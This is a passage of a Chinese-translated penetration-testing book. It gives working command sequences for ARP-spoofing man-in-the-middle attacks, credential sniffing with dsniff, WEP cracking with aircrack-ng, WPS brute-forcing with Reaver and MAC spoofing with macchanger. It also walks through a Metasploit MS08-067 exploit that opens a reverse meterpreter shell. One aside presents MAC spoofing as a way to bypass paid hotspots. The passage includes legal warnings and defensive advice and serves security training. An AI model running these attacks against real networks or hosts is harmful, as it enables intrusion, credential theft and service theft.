Wireshark 适用于 Windows、Mac 和 Linux 操作系统。请访问[`www.wireshark.org/`](http://www.wireshark.org/)获取有关功能和支持的其他信息。Kali Linux 已预装 Wireshark，因此您无需安装它，但您可能需要在任何您想要的操作系统上安装它。

## Ettercap

Ettercap 执行中间人攻击，将自己定位为路由器或服务器。

![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_26.jpg)

攻击者可以使用 Ettercap 进行以下目的：

+   操纵数据

+   收集 FTP、HTTP、POP 和 SSHv1 等协议的密码

+   伪造 HTTPS 会话中的 SSL 证书

在这个 Ettercap 的演示中，我们将在 ARP 欺骗后将我们的 Kali Linux 系统定位为“中间人”。让我们开始吧！

1.  通过打开 bash 终端并输入`ettercap –G`以图形模式打开 Ettercap：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_11.jpg)

1.  选择**Sniff**，然后选择**Unified sniffing…**：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_12.jpg)

1.  选择**Hosts**，然后选择**Scan for hosts**：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_13.jpg)

网络范围将由您在上一步中选择的接口的 IP 设置确定。

1.  点击**Hosts**，然后点击**Hosts list**：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_14.jpg)

1.  选择路由器的 IP 地址，然后点击**添加到目标 1**。如果您想要针对另一个路由器或主机进行操作，选择列表中的另一个 IP 地址，然后点击**添加到目标 2**。![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_15.jpg)

如果您没有选择任何内容，您将对整个子网进行 ARP 欺骗。不要在任何生产网络上运行这个！IP 地址`192.168.146.1`是我们在这个演示中将要使用的路由器。

1.  点击**Mitm**，然后点击**ARP 欺骗…**：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_16.jpg)

1.  勾选**嗅探远程连接**的框：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_17.jpg)

1.  点击**开始**，然后点击**开始嗅探**：![Ettercap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_18.jpg)

现在子网已经被困在中间人攻击中，攻击者只需要对子网运行修改或过滤的攻击。这些过滤器可以通过 Ettercap 提供的插件使用，也可以由您自己创建。这就是常见攻击，如 DNS 欺骗、FTP 提示更改或 SSH 降级攻击发生的地方。最终用户甚至不会知道发生了什么。网络管理员可以使用 Wireshark 确定数据包的来源并追踪攻击者的 IP 地址。作为安全的一般规则，不要使用默认或自动设置。强制执行最高级别的安全性，并与员工讨论安全最佳实践。

## dsniff

dsniff 是一个高级密码嗅探器，可以识别许多不同的网络协议，如 Telnet、FTP、SMTP、POP、IMAP、HTTP、CVS、Citrix、SMB、Oracle 等等。虽然 Wireshark 可以提供有关数据包的大量信息，但 dsniff 可以提供用户名和密码。您可以指定要监听的接口，甚至将输出保存为文件格式以供以后阅读。让我们看看如何使用 dnsiff！

![dsniff](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_19.jpg)

执行以下步骤：

1.  打开一个新的终端窗口。

1.  输入以下命令：

```
dsniff –n –i eth0

```

选项`-n`不会将 IP 地址解析为主机名。选项`-I`是我们选择的网络接口，即`eth0`。

![dsniff](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_20.jpg)

1.  使用用户名和密码登录之前提到的任何网络协议：![dsniff](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_21.jpg)

1.  如果您回头看其他终端，您会看到 dsniff 已经显示了您的登录凭据：![dsniff](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_22.jpg)

如果有人使用无加密方式登录，dsniff 将捕获登录凭据。这就是为什么强烈建议用户在可用时始终使用加密。请确保您使用最新的 TLS 标准和一个具有 2048 位以上密钥的优秀安全证书。如果您正在配置服务器，请将默认端口更改为某个唯一的端口。这将有助于减少潜在攻击的数量和可能存在的其他安全风险。

假设您想使用 dsniff 在本地 LAN 上嗅探远程计算机的密码？当然没问题！有一个名为**arpspoof**的工具，它允许您欺骗攻击计算机的 IP 地址成为默认网关或中间人攻击。为了使这种攻击起作用，您必须为您的计算机启用 IP 路由，以便成功地在两台计算机之间建立适当的通信。

# 识别您的目标

作为渗透测试人员，了解和知道您的目标是至关重要的。不仅仅是计算机，还有很多其他因素需要考虑。服务器、智能手机、平板电脑和网络硬件也是渗透测试的一部分。了解软件或系统是否已应用补丁非常重要，因为我们不希望在生产环境中未经授权地访问这些设备和系统。

![识别您的目标](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_03_23.jpg)

照片来源：Bogdan Suditu 通过 photopin cc

诸如 Nmap 和 Zenmap 之类的工具可以用于扫描整个网络。尽管这是获取操作系统和软件版本等信息的快速方式，但并不总是准确的。根据情况，有时最好去每个设备和系统了解网络上正在使用的内容。如果客户能够提供网络文档和硬件清单，那将非常有帮助。

# 保护/预防自身免受攻击

无论情况如何，我们始终需要知道如何保护自己免受可能发生的任何威胁。无论是来自网络内部还是外部，您都需要了解自己作为个人或企业可能受到影响的方式。有几种方法可以保护自己免受此类攻击：

+   保护/预防 Nmap 和 Zenmap：

+   创建自定义防火墙规则和访问列表

+   监控网络流量的任何硬件 IDS 24/7

+   阻止或过滤 ICMP ping

+   保护/预防无线扫描：

+   配置最新的无线加密算法

+   配置 MAC 过滤规则

+   关闭或隐藏无线广播

+   关闭 UPnP 支持

+   保护/预防无线网络嗅探：

+   使用 HTTPS 和 SSH 而不是 HTTP 和 telnet

+   使用 VPN 服务进行连接

+   仅连接到可信任的无线网络

# 总结

在本章中，您学习了如何扫描无线网络以获取信息，看到了两种不同类型的无线扫描，并了解了它们的工作原理。您了解了如何使用 Ettercap 通过 ARP 欺骗来嗅探无线网络，以及如何使用 dsniff 来获取登录凭据。我们还讨论了如何在无线渗透测试期间识别目标。

最后，您学会了几种不同的方法来保护自己免受这些攻击。保持攻击者的心态非常重要，因为这将使您对可能威胁您个人或企业的更多安全威胁有更多的认识。始终连接到可信任的无线网络，使用加密（如果可用），并在旅行时使用 VPN。


# 第四章：渗透无线网络

在本章中，您将学习如何计划攻击和破解 WEP/WPA/WPA2 无线网络，并学习 MAC 地址欺骗以获取对网络的未经授权访问。您还将学习如何保护自己免受这些威胁。本章将提供 Kali Linux 的实践、逐步说明。请记住，只有在第一章结尾提到的任何无线网卡或适配器，您才能跟随本章的破解部分。

在我们开始之前，有一些事情您应该知道，我们在破解任何无线网络之前：

+   未经授权破解任何无线网络是非法的

+   如果您未经授权被抓到，您将根据您所在地区的法律面临后果

+   请只在您自己的网络上演示技术

# 计划攻击

在我们对任何无线加密进行扫描或破解之前，我们需要做的第一件事是计划一次攻击。我们需要确保我们有一切必需的东西来进行无线渗透测试，并尽可能多地问自己问题，以免在途中遇到任何障碍。让我们从需求列表开始，然后再看看我们将采取哪些步骤来破解无线网络。

![计划攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_02.jpg)

## 攻击所需的东西？

这里，我们列出了进行全面无线攻击所必需的东西：

+   **兼容的无线适配器**：注意它必须支持数据包注入

+   **Kali Linux 操作系统**：我们所有的安全工具都是预装的

+   **纸和笔做笔记**：这将帮助我们保持有序

## 攻击无线网络的计划

以下是计划无线攻击的步骤：

1.  扫描该地区的无线网络列表。

1.  注意 BSSID、信道号和加密。

1.  列出您将使用的几种攻击方法：

+   Airodump

+   Aircrack

+   字典攻击

+   默认登录

+   猜测密码

1.  按照每种方法进行。

1.  记录成功和失败的结果。

1.  重试。

# 无线密码破解

有许多不同的方法来破解无线加密。我将介绍破解无线网络最常见的方法。在接下来的几节中，我将详细讨论每种无线加密，然后演示如何破解这些无线加密类型。让我们开始吧！

## WEP 加密

**有线等效隐私**（**WEP**）加密是一种标准的 Wi-Fi 无线网络安全算法，用于保护个人和商业网络。WEP 密钥由网络管理员创建，以允许本地网络上的设备组安全连接。当每个数据包从客户端发送到无线接入点时，它会被编码为十六进制数字序列。这些数字包括 0 到 9 的数字和 A 到 F 的字母。

![WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_04.jpg)

WEP 密钥越长，WEP 加密的位数就越强。例如，如果您有一个包含 10 个字符的 WEP 密钥，它可能在 40 到 60 位之间，而具有更复杂的 58 个字符的 WEP 密钥将更强大，大约为 256 位。一些网络仍然依赖 WEP 加密，因为个人或企业可能仍然有旧设备通过 Wi-Fi 连接。截至今天，仍然有一些仓库或工厂使用 WEP 加密，因为他们根本不想投资于可能破坏生产网络的新技术。

## 破解 WEP 加密

在本节中，我们将逐步介绍如何破解 WEP 加密的步骤说明。

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_05.jpg)

1.  打开终端，输入以下命令，然后按*Enter*：

```
airmon-ng start wlan0

```

此命令将启动`wlan0`接口进入监视模式。**监视模式**是一个功能，允许您的计算机监听无线卡范围内的每个无线数据包。这种模式将允许我们向无线网络注入数据包。以下是输出：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_07.jpg)

1.  然后输入以下命令并按*Enter*：

```
airodump-ng mon0

```

此命令在无线接口上启用监视模式。以下是输出：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_08.jpg)

1.  输入以下命令并按*Enter*：

```
airodump-ng –c 6 –w capture --bssid 00:13:10:9A:4E:B5 mon0

```

以下是命令的组成部分：

+   `-c`：这是频道

+   `-w`：这给予文件写入权限

+   `--bssid`：这是无线接入点的 MAC 地址

以下是前述命令的输出：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_09.jpg)

您需要用您的网络信息替换粗体部分。

1.  输入以下命令并按*Enter*：

```
aireplay-ng -1 1000 –q 10 –e linksys–a 00:13:10:9A:4E:B5 –h 00:11:22:33:44:55 mon0 –ignore-negative-one

```

以下是命令的组成部分：

+   `-1`：这是每次突发传输的数据包数

+   `-q`：这是保持活动之间的秒数

+   `-e`：这设置了目标 AP SSID

+   `-a`：这设置了接入点的 MAC 地址

+   `-h`：这设置了源 MAC 地址（`00:11:22:33:44:55`是伪造的 MAC 地址）

+   `-ignore-negative-one`：这解决了`mon0`上的固定频道

如果您在运行此命令时遇到问题，请尝试在启用监视模式后将接口关闭。以下是您可以这样做的方法：

```
airmon-ng start wlan0

```

然后，运行以下命令：

```
ifconfig wlan0 down

```

这将解决频道`-1`错误消息，如下所示：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_10.jpg)

1.  输入以下命令并按*Enter*：

```
aireplay-ng -3 –b 00:13:10:9A:4E:B5 –h 00:11:22:33:44:55 mon0

```

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_11.jpg)

1.  是时候破解 WEP 密钥了！输入以下命令并按*Enter*：

```
aircrack-ng capture-01.cap

```

在这里，`capture-01.cap`是包含数据的文件名。它可以是完整的数据包或仅包含 IVs 的文件。必须至少有四个 IVs。

只有当 100%的十六进制密钥已转换为 ASCII 时，才会显示 WEP 密钥。一旦您收到密钥，您可以尝试连接到无线网络。

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_12.jpg)

如果您能够破解网络密钥，恭喜您成功破解了一个 WEP 加密的网络！如果您没有成功，不要担心。每个网络和无线接入点都是不同的。这还取决于您和接入点之间的信号以及使用的加密方式。

## 破解 WPA 和 WPA2 加密

WPA 和 WPA2 是用于保护无线网络的两种不同的安全算法。WPA 使用 TKIP，而 WPA2 同时使用 TKIP 和 AES。截至今天，大多数常见的无线路由器和接入点都提供了一种快速和无忧的连接到安全网络的方法。WPS 是一个允许轻松设置安全网络的功能；然而，WPS 可以很容易地通过 Kali Linux 中提供的正确安全工具来破解。WPA 旨在取代 WEP，因为安全机构发现严重的缺陷使得在几分钟内轻松获得未经授权的访问成为可能。尽管破解 WPA 要困难得多，但仍然有可能破解 WPA 甚至最新的 WPA2 加密算法。

在本节中，我将演示破解 WPA 和 WPA2 无线网络。

1.  打开终端并输入以下命令：

```
airmon-ng start wlan0

```

此命令将启动`wlan0`接口进入监视模式：

![破解 WPA 和 WPA2 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_14.jpg)

1.  输入以下命令并按*Enter*：

```
airodump-ng mon0

```

这将允许我们向无线网络注入数据包。

![破解 WPA 和 WPA2 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_15.jpg)

1.  输入以下命令并按*Enter*：

```
reaver –i mon0 –c 11 –e Johns –b 20:AA:4B:F2:25:4E –vv --no-nacks

```

以下是前述命令的组成部分：

+   `-i`：这是无线接口

+   `-c`：这是频道号

+   `-e`：这设置了目标接入点

+   `-b`：这设置了目标 MAC 地址

+   `-vv`：这将两次设置详细选项，以增加详细信息并在尝试时显示每个 PIN 号码

+   `--no-nacks`：这可以确保目标接入点的可靠性更高

以下是输出：

![破解 WPA 和 WPA2 加密](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_16.jpg)

您需要更改加粗的部分。这个过程可能需要 2 到 10 小时才能完成。如果失败了，可能是因为无线信号强度不好或者这个设备没有实现 WPS。

### 什么是 Reaver？

Reaver 是一个免费的开源工具，可以利用和破解 WPA 或 WPA2 加密的无线网络。它还设计用于对启用 WPS 的无线接入点进行暴力攻击。

### Reaver 是如何工作的？

现在您知道 Reaver 是什么了，我们需要简要讨论一下它是如何工作的。Reaver 利用了无线设备中的一个功能，叫做 WPS。**Wi-Fi Protected Setup**（**WPS**）允许那些不知道如何设置无线安全的人轻松设置。它生成一个 PIN 码，该 PIN 码是硬编码到该特定设备的。Reaver 利用 PIN 码中的漏洞，只需片刻就能揭示 WPA 或 WPA2 密码短语。

### 保护自己免受 Reaver 攻击

要轻松保护自己免受 Reaver 攻击，禁用无线设备的 WPS 功能。如果您是企业用户，请使用 WPA2-PSK（AES）。如果您是家庭用户，请使用 WPA2 个人 AES。永远不要生成密码，使用一个强大的复杂密码短语，并经常更新密码短语。

## WPA/WPA2 破解结果

如您在以下截图中所见，我们已经破解了 WPA/WPA2 加密。如果您尝试连接到无线网络，它将要求输入 PIN 码或 WPA PSK 密钥。输入其中一个，您应该就可以完全访问该无线网络，如图所示：

![WPA/WPA2 破解结果](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_17.jpg)

# 欺骗您的 MAC 地址

我相信你现在肯定知道 MAC 地址过滤并不是真正安全的。在我看来，它比 WEP 加密要不那么有效，因为很容易伪造。这并不意味着 MAC 地址过滤是没有用的。它确实可以阻止很多攻击者，他们只针对最薄弱的网络。无论你做什么，都不要仅仅依靠 MAC 过滤！WEP 加密要比没有加密好。

![欺骗您的 MAC 地址](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_18.jpg)

这并不需要很多技能。你所需要做的就是监听无线网络上的网络流量，并将你的 MAC 地址更改为已连接的人的 MAC 地址。使用自动化脚本或应用程序，更改 MAC 地址就像 123 一样容易。接下来，我将演示如何使用一个名为**macchanger**的工具欺骗您的 MAC 地址。

1.  打开终端。

1.  输入以下命令并按*Enter*：

```
ifconfig wlan0 down:

```

此命令关闭或禁用无线接口。

1.  要重新打开`wlan0`，输入以下命令并按*Enter*：

```
Ifconfig wlan0 up

```

以下是输出：

![欺骗您的 MAC 地址](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_20.jpg)

1.  输入以下命令并按*Enter*：

```
macchanger –-random wlan0::

```

此命令会为无线接口随机生成一个虚假的 MAC 地址：

![欺骗您的 MAC 地址](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_21.jpg)

1.  输入以下命令并按*Enter*：

```
macchanger --–mac=00:11:22:33:44:55 wlan0

```

此命令允许您在无线接口上分配一个 MAC 地址进行欺骗，如下所示：

![欺骗您的 MAC 地址](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_22.jpg)

就是这样！很容易吧？知道这些可以帮助绕过付费的热点网络，用户必须支付一定时间的费用。咖啡店、餐厅、机场和酒店都会有这种网络。当用户支付时，他们的 MAC 地址会被添加到允许访问互联网的 MAC 地址列表中。

# 保护自己免受无线攻击

我们总是需要知道如何保护自己免受这些威胁和攻击。

![保护自己免受无线攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_04_23.jpg)

接下来，我们将讨论如何保护自己免受这些攻击：

+   更强的加密将减少攻击风险

+   MAC 过滤也可以帮助减少攻击风险

+   只有在您的设备与 WPA/WPA2 不兼容时才使用 WEP；然而，由于不安全，不建议使用

+   为业务网络创建一个单独的 VLAN 以限制访问

+   禁用或关闭 WPS 设置

+   创建一个强大、复杂的密码短语

+   应该每 3 或 4 个月更改一次密码短语

+   不要使用制造商配置的默认密码

+   使用 EAP 而不是 PSK

+   更改默认的 SSID 名称

# 总结

就这些了！希望你喜欢我为你准备的演示。这一章对我们两个来说都很有趣和有趣。让我们花一点时间回顾一下你在这一章学到了什么。

在本章中，我们制定了一项攻击计划。接下来，我们列出了几种攻击方法。然后，我们详细介绍了 WEP、WPA 和 WPA2 加密的信息。最后，我们列出了几种减少无线攻击风险的方法。

在下一章中，我们将介绍如何识别无线网络上的主机，确定网络规模，并检测该网络上的易受攻击的设备和系统。我相信你和我一样兴奋。让我们继续吧！


# 第五章：访问网络

我们来到了第五章！在本章中，我们将讨论一些与您作为无线渗透测试人员访问网络相关的话题。我们将对网络进行评估，以识别主机、确定网络规模和检测易受攻击的主机。在进行渗透测试时，了解网络上有多少主机是一个好主意，因为您绝对不希望漏掉任何内容。让我们开始本章，讨论为什么这很重要。

在本章中，我们将讨论以下话题：

+   识别主机

+   确定网络规模

+   检测易受攻击的主机

+   防范威胁

如果网络上有运行 Windows 2000 或 XP 的客户端，我们需要知道。用户完全意识到他们处于风险之中，因为他们使用的是较旧版本的 Windows 操作系统。Windows XP 可能在几分钟内被攻破！截至 2014 年 4 月，微软停止了对 Windows XP 的支持。Windows XP 已不再受支持，这意味着这个操作系统版本将吸引许多寻找漏洞的攻击者。背后的原因很简单，因为微软将不再发布任何安全补丁，所以如果攻击者在系统中发现漏洞，它将永远保持易受攻击状态。

我们将使用几个网络工具来确定网络上有多少主机、主机的操作系统版本、网络规模和易受攻击的主机。了解网络上的易受攻击部分，然后提供安全补丁或更新将有助于加强安全性。请记住，您不仅需要了解哪些系统和设备易受攻击，还需要了解您组织中的用户！

这可能是我看到的最大的安全威胁之一。您的员工需要接受安全意识培训，了解什么是好的，什么是坏的，以及应该做什么，不应该做什么。您还可能有员工在工作之外分享客户信息以获取潜在利益。请留意任何可能损害业务的可疑活动。

# 识别主机

本节主要介绍您可以用来识别网络主机的不同工具。这些工具将提供有关用户 IP 地址、MAC 地址、开放和关闭的端口、服务、操作系统等详细信息。在接下来的章节中，您可以看到 Kali Linux 拥有的一些可以帮助识别网络主机的工具列表。

## 网络映射工具

我们将专注于 Nmap 通过命令行界面。以下是一些可用于绘制网络地图的替代工具：

+   0trace

+   Angry IP Scanner

+   hping2 和 hping3

+   lanmap 和 lanmap2

+   TCP 路由跟踪

在这个演示中，您将学习如何使用 Nmap 来识别网络上的主机。这些工具在网络发现或需要知道网络服务是否运行（如 Telnet、SSH 或 FTP）时是我最喜欢的。让我们开始吧！

1.  打开终端。

1.  输入以下命令并按*Enter*键：

```
ifconfig

```

如您在以下截图中所见，我的私人 IP 地址是`192.168.1.5`。我的网关是`192.168.1.1`，所以下面我将向您展示如何扫描整个子网。

![网络映射工具](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_01.jpg)

1.  输入以下命令并按*Enter*键：

```
nmap 192.168.X.0/24

```

这个命令将在`192.168.1.1`到`192.168.1.254`上的所有主机上启动一个 ping 扫描。当您收到输出时，您会注意到一些有趣的信息，如开放和关闭的端口、服务以及它们正在运行的操作系统。

如果主机感染了 Conflicker，这也是一个很好的技术。您需要学习一些 Nmap 的命令行开关来做到这一点。

如您在以下截图中所见，我能够检测到我的本地网络上的几个系统和设备：

![网络映射工具](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_02.jpg)

您可以看到我的思科无线路由器和开放和过滤的端口：

![网络映射工具](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_03.jpg)

1.  如果您在网络上有防火墙，您需要运行以下命令：

```
nmap –PN 192.168.X.0/24

```

此命令将所有主机视为在线并跳过主机发现。它用于绕过防火墙的常见过滤器，以确定防火墙是否在线，并在下面的屏幕截图中说明：

![网络映射工具](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_04.jpg)

# 确定网络规模

确定网络规模并不难。如果您对网络有一些经验，那就更容易了。我将提供几个步骤，介绍如何确定网络规模和估计主机数量。让我们开始吧！

## 在 Kali Linux 中确定网络规模

在这个演示中，我们将确定 Kali Linux 中的网络规模。执行以下步骤：

1.  打开终端。

1.  键入以下命令并按*Enter*：

```
ifconfig | grep Mask

```

以下是输出：

![确定 Kali Linux 中的网络规模](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_05.jpg)

您需要上下滚动以导航到您的网络配置。子网掩码显示在前面的屏幕截图中为`255.255.255.0`。如果我们通过一些子网计算来计算，我们可以确定这个网络可能有 1 到 254 个主机。

您可能会问，确定网络规模与渗透测试有什么关系？确定网络规模有助于渗透测试人员估计网络上的主机数量。当知道网络数量时，这可以帮助使渗透测试更容易，比如数据中心或大学校园等。

# 检测易受攻击的主机

这一部分非常简单。如果您碰巧认识一个不每天更新系统的人，他们很可能容易受到最新的安全威胁。截至目前，Windows XP 非常不安全，特别是如果用户的系统上没有安装任何更新或服务包。在下一个演示中，我将向您展示 Windows XP 中的漏洞。由于我手头没有有效的 Windows 7 或 8 副本，我无法演示这些操作系统。

让我们执行以下步骤：

1.  扫描目标以查看正在运行的服务：![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_06.jpg)

该命令启用操作系统检测、版本检测、脚本扫描和跟踪路由。

1.  使用 Nessus 扫描漏洞。

### 注意

如果您是第一次运行 Nessus，请注意您需要先注册 Nessus。

1.  在下面的屏幕截图中，您将看到我们提供了要扫描漏洞的主机的 IP 地址。主机正在运行 Windows XP 专业版 Service Pack 3。![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_07.jpg)

1.  如下截图所示，我们现在准备好点击**启动**以使用 Nessus 开始扫描：![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_08.jpg)

1.  扫描完成后，我们需要分析报告：![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_09.jpg)

1.  如您在我们的结果中所见，有几个易受攻击的服务：![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_10.jpg)

如果您选择其中一个并查看插件的名称，它会显示`MS08-067`。我们将稍后使用这个来找到我们的漏洞利用程序。

1.  让我们开始搜索我们的漏洞利用程序。使用以下命令启动新的 Metasploit 控制台：

```
msfconsole

```

出现以下屏幕：

![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_11.jpg)

### 注意

Metasploit Framework 可以从[`www.rapid7.com/products/metasploit/download.jsp`](http://www.rapid7.com/products/metasploit/download.jsp)下载。Metasploit Framework 是由 H.D. Moore 于 2003 年开发的开源攻击框架。它用于测试目的入侵系统和设备。它为进行渗透测试、IDS 签名开发和漏洞研究提供信息。

1.  要搜索我们的漏洞利用程序，请键入以下内容：

```
search ms08

```

以下是输出：

![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_12.jpg)

1.  输入所有这些命令：

+   `use exploit/windows/smb/ms08_067_netapi`:此命令设置 Metasploit Framework 使用利用`ms08_067_netapi`

+   `set RHOST 192.168.1.30`:此命令将远程主机设置为您正在利用的用户

+   `set PAYLOAD windows/meterpreter/reverse_tcp`:此命令将有效负载设置为`reverse_tcp`，以便在成功利用后我们可以连接回主机

+   `set LHOST 192.16``8.1.5`:此命令设置本地主机，即 Kali Linux 主机的 IP 地址

+   `exploit`:此命令实时启动利用程序，以便您可以看到详细信息的操作

1.  如果您想运行不同的有效负载，请使用以下命令：

```
show payloads

```

在下面的屏幕截图中，我们可以看到我们之前输入的命令的输出：

![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_13.jpg)

如果操作正确，我们应该有一个 Meterpreter shell：

![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_14.jpg)

Meterpreter shell 是您和被利用主机之间完全独立的环境。它不是必需运行的，而更多是一个概念的证明。您可以执行程序、批处理脚本；浏览系统层次结构、hashdump、网络配置；甚至从网络摄像头中拍摄快照。那么如果有人能够在您身上获得一个 Meterpreter 会话会发生什么？他们可以在系统中创建后门并获得管理员权限。

恭喜！我们已成功在无线网络上检测和利用了一个易受攻击的主机。从这里，我们可以查看目标系统上运行的进程，截取屏幕截图，记录按键，甚至查看连接的网络摄像头。Meterpreter 是一个非常强大的 shell。一定要花些时间好好研究一下它。

![检测易受攻击的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_05_15.jpg)

# 防范威胁

我们总是需要知道如何保护自己免受这些威胁和攻击。接下来，我将讨论如何保护自己免受这些攻击。

## 防止主机的识别

为了保护自己免受威胁和风险，小型和大型企业应该拥有硬件防火墙，如 WatchGuard XTM 或 Cisco ASA，并使用自定义规则来阻止未使用的服务和端口。未使用的服务也应该从服务器或网络设备中禁用，以防止任何未经授权的访问。入侵检测系统应启用短信或电子邮件的警报功能。防火墙应记录协议并标记警报。

如果防火墙或 IDS 没有受到监控，那么您怎么知道您的组织是否受到了损害？每天的监控非常重要，以便及时应对外部网络上存在的威胁和风险。使用 VLAN 将网络彼此隔离。服务器、工作站、VoIP 和无线设备应该有自己的 VLAN，以防止网络感染和妥协。

## 防止他人确定您的网络规模

在确定网络规模时，您应始终加密任何敏感信息，例如网络图表、密码、日志、工作站和服务器信息以及配置设置。WatchGuard XTM 或 Cisco ASA 等硬件防火墙非常适合小型和大型企业，可以通过阻止 ICMP 来控制流量，并只允许来自受信任来源的流量。

## 保护易受攻击的主机

为了保护系统和网络设备免受利用，安装供应商提供的最新安全补丁。在可用时安装最新的操作系统和软件更新。如果在升级时遇到冲突，请向软件供应商报告问题。使用最强大的无线加密 WPA2 和 AES 加密算法以及复杂的密码。在所有工作站和服务器上运行具有最新病毒定义的实时防病毒扫描程序。为员工提供安全意识培训。

# 摘要

哇！在这一章中我们完成了三次演示！我希望你和我一样享受这些演示。这一章对我们来说非常有趣和有意思。让我们花点时间回顾一下你学到了什么。

在这一章中，我们讨论了在进行网络渗透测试时找到活跃主机数量的重要性。接下来，我们演示了如何使用 Kali Linux 识别网络上的主机。然后，我们演示了确定网络规模，并解释了作为渗透测试人员理解这一点的重要性。最后，我们演示了使用 Nessus 漏洞扫描器检测 Windows XP 中的漏洞，并列出了一些可以帮助减少风险的预防措施。

在下一章中，我们将介绍如何规划漏洞评估、配置 Nessus 漏洞扫描器、运行 Nessus 漏洞扫描器以及修补漏洞。我相信你和我一样都很兴奋。让我们继续下一章吧！


# 第六章：漏洞评估

